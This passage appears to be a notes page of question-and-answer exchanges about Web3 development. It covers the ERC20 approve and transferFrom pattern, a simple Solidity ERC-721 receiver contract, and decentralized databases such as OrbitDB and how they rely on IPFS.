transactions.</p></li><li><p><strong>Cons:</strong> Can introduce security risks if not handled carefully, like excessive allowances.</p><p></p></li></ul><h3>4. <strong>User Interface Guidance</strong></h3><ul><li><p><strong>Standard:</strong> Regardless of the technical approach, clear UI/UX design is standard to guide users through the approval process, ensuring they understand why it's necessary.</p></li><li><p><strong>Pros:</strong> Enhances user trust and interaction.</p></li><li><p><strong>Cons:</strong> Still requires users to follow steps, albeit with better guidance.</p><p></p></li></ul><h3><strong>Best Practice:</strong></h3><ul><li><p><strong>For General ERC20 Transfers:</strong> Use the explicit <code>approve</code> and <code>transferFrom</code> pattern, as it is widely accepted and compatible with all ERC20 tokens.</p></li><li><p><strong>For Advanced Use Cases:</strong> Implement <code>permit</code> for gasless approvals if the token and use case support it.</p></li><li><p><strong>UI/UX Design:</strong> Always provide clear instructions and feedback to users about the need for approvals and the steps involved.</p></li></ul><p></p><p>So its normal to always do approve and then do anything else?</p><p></p><p>Yes, in the context of interacting with ERC20 tokens and most decentralized applications (dApps), it's <strong>normal and standard</strong> to:</p><ol><li><p><strong>Call </strong><code>approve</code><strong>:</strong> The user first calls the <code>approve</code> function on the ERC20 token contract, specifying the spender (usually a smart contract) and the amount of tokens to allow the spender to use.</p></li><li><p><strong>Call the desired function:</strong> After approval, the user calls the function on the smart contract (e.g., <code>transferFrom</code>, <code>buyOrder</code>, <code>claimNft</code>, etc.) that requires the tokens to be transferred or used.</p></li></ol><h3>Why is it Normal?</h3><ul><li><p><strong>Security:</strong> The <code>approve</code> mechanism provides an additional layer of security, as it requires explicit user consent for the transfer of tokens by a third-party contract.</p></li><li><p><strong>Flexibility:</strong> It allows users to control how many tokens they are willing to let a contract handle on their behalf.</p></li></ul>

<h2>How to make contract nft receiver</h2>
<h2>For ERC-721 (Single Token Standard)</h2><p></p><pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract NFTReceiver is IERC721Receiver {
    event NFTReceived(address operator, address from, uint256 tokenId, bytes data);

    // This function is called whenever an ERC-721 token is transferred to this contract
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        emit NFTReceived(operator, from, tokenId, data);
        
        // Return this value to indicate successful receipt
        return this.onERC721Received.selector;
    }
}</code></pre><p></p>

<h2>Are there any decentralized database solutions?</h2>
<p>Yeah, there are some decentralized database solutions out there that try to solve this. A few options:</p><ol><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://github.com/orbitdb/orbitdb?tab=readme-ov-file"><strong>OrbitDB</strong></a> ‚Äì Built on IPFS, it's a peer-to-peer database where data is replicated across nodes that choose to store it. Could work, but you‚Äôd need to ensure availability.</p></li><li><p><strong>Gun.js</strong> ‚Äì A decentralized graph database that syncs across peers. It‚Äôs lightweight and works well for real-time applications.</p></li><li><p><strong>Ceramic Network</strong> ‚Äì A decentralized, event-driven database that lets users control their own data while apps can still query it.</p></li><li><p><strong>Fluence</strong> ‚Äì A decentralized compute and storage network where data is distributed across nodes.</p></li><li><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://polybaselabs.com/database"><strong>Polybase</strong></a> ‚Äì A more Web3-focused solution with access control baked in, kind of like Firebase but decentralized.</p></li></ol><p>The biggest issue with fully decentralized storage is syncing between devices. Most solutions either store the data locally (which sucks for multi-device access) or require some form of node hosting (which means someone still has to maintain infra).</p><p>One approach could be a hybrid system‚Äîusers store encrypted data on a decentralized network (like IPFS/Filecoin), but a small indexing service helps with discovery. That way, you don‚Äôt control their data, but they can still access it across devices.</p><p><br>So how does orbit for example deal with this, where is the db stored? So lets say I have my app/service and I host the db on my machine and then other users using the can then also host it but I wont be able to see their data right?</p><p>OrbitDB is built on <strong>IPFS (InterPlanetary File System)</strong>, meaning it‚Äôs <strong>distributed</strong> and <strong>replicated</strong> across peers. Here's how it works:</p><p></p><ol><li><p><strong>Local Storage on Each User‚Äôs Device</strong></p><ul><li><p>When a user interacts with the database, a copy is stored on their device.</p></li><li><p>The database is replicated across other nodes that are connected to it.</p></li><li><p>OrbitDB uses <strong>LevelDB</strong> or <strong>IndexedDB</strong> (browser storage) for local persistence.</p></li></ul></li><li><p><strong>IPFS as the Transport Layer</strong></p><ul><li><p>When data is written, it‚Äôs stored in <strong>IPFS</strong> as immutable content-addressed entries.</p></li><li><p>The database itself is a series of append-only logs (CRDT-based, like event sourcing).</p></li><li><p>Each data entry gets a <strong>CID (Content Identifier)</strong> in IPFS.</p></li></ul></li><li><p><strong>Access Control &amp; Encryption</strong></p><ul><li><p>By default, anyone who has access to the OrbitDB address can read it.</p></li><li><p>You can encrypt data before storing it, so only the owner can decrypt it.</p></li><li><p>Write access is controlled using <strong>OrbitDB identities</strong> (keys &amp; signatures).</p></li></ul></li></ol><p></p><h3>Can You See Other Users' Data?</h3><p>If <strong>each user hosts their own database</strong>, then <strong>no, you won‚Äôt see their data</strong> unless:</p><ul><li><p>They explicitly share it with you.</p></li><li><p>They don‚Äôt encrypt it and you have access to the OrbitDB address.</p></li></ul><p>If your app hosts a "shared" OrbitDB instance, then anyone connecting can read the data unless encryption is applied.</p><p></p><p>Do I need the ipfs for the db?</p><p>Yes, <strong>you need IPFS</strong> for OrbitDB because:</p><ol><li><p><strong>Storage &amp; Transport</strong> ‚Äì OrbitDB uses IPFS to store and distribute data across peers.</p></li><li><p><strong>Content Addressing</strong> ‚Äì Every data entry in OrbitDB is stored as an IPFS object with a unique <strong>CID (Content Identifier)</strong>.</p></li><li><p><strong>Decentralization</strong> ‚Äì IPFS ensures the data is not hosted on a single server but can be replicated across multiple nodes.</p></li></ol>



